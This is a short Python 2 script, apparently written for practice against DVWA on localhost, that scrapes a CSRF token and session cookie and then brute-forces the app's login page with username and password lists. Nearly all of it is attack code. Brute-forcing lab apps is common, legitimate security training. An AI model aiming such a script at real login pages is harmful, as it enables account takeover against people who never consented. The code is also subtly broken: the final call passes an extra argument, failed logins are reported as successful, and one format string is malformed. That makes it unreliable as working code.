#!/usr/bin/python

import requests
import sys
import re
from BeautifulSoup import BeautifulSoup


targetURL = "http://127.0.0.1/dvwa"
success = "Welcome to the password protected area"
dvwa_user = "admin"
dvwa_pass = "password"
sec_level = "low"

def csrf_token():
    try:
        print "\n[i] URL: %s/login.php"%targetURL
        r = requests.get("{0}/login.php".format(targetURL))
    except:
        print "\n[!] csrf_token: Failed to connect (URL: %s/login.php).\n[i] Quiting." % (targetURL)
        sys.exit(-1)

    soup = BeautifulSoup(r.text)
    #print "Printing Soup output here!!!!!!!!!!!!!!!!!!!!!!"
    #print soup
    user_token = soup("input",{"name":"user_token"})[0]["value"]
    print "[i] user_token: %s" %user_token

    session_id = re.match("PHPSESSID=(.*?);", r.headers["set-cookie"])
    session_id = session_id.group(1)
    print "[i] session_id: %s" % session_id

    return session_id, user_token

def dvwa_login(session_id,user_token):
    data = {"username":dvwa_user,"password":dvwa_pass,"user_token":user_token,"Login":"Login"}
    cookie = {"PHPSESSID": session_id, "security":sec_level}
    try:
        print "\n[i] URL: %s/login.php" %targetURL
        print "[i] Data: %s"%data
        print "[i] Cookie: %s"%cookie
        r = requests.get("{0}/login.php".format(targetURL), data = data, cookies = cookie, allow_redirects = False)
    except:
        print "\n\n[i] dvwa_login: Failed to connect (URL: %s/login.php).\n[i] Quiting." % (targetURL)
        sys.exit(-1)

    if r.status_code !=303 and r.status_code !=302:
        print "\n\n[i] dvwa_login: Page didnt respond correctly (response: %s).\n[i] Quiting" % (r.status_code)
        sys.exit(-1)

    if r.headers["Location"] != 'index.php':
        print "\n\n[!] dvwa_login: Didnt login (Header: %s user: %s password: %s user_token:%s session_id:%s).\n[i] Quiting." %(
            r.headers["Location"], dvwa_user, dvwa_pass, user_token, session_id)


    print "\n[i] Logged in! (%s/%s)\n" % (dvwa_user, dvwa_pass)
    return True

def url_request(username, password, session_id):
    data = {"username": username, "password": password, "Login":"Login"}
    cookie = {"PHPSESSID": session_id, "security": sec_level}
    try:
        r = requests.get("{0}/vulnerabilities/brute/".format(targetURL), params=data, cookies=cookie, allow_redirects=False)
    except:
        print "\n\n[!] url_request: Failed to connect (URL: %S/vulnerabilities/brute/).\n[i] Quiting." %(targetURL)
        sys.exit(-1)

    if r.status_code != 200:
        print "\n\n[!] url_request: Page didnt response correctly (response: %s).\n[i] Quiting." % (r.status_code)
        sys.exit(-1)

    return r.text

def brute_force(session_id):
    with open('passlist.txt') as password:
        password = password.readlines()
    with open('usernames.txt') as username:
        username = username.readlines()

    i = 0

    for PASS in password:
        for USER in username:
            USER = USER.rstrip('\n')
            PASS = PASS.rstrip('\n')

            i += 1
            print ("[i] Try %s: %s // %s" %(i, USER, PASS))
            attempt = url_request(USER,PASS, session_id)

            if success in attempt:
                print "Found!!! Username: %s, Password %s" %(USER, PASS)
                return True
    return False

session_id, user_token = csrf_token()
dvwa_login(session_id, user_token)
brute_force(session_id, user_token)
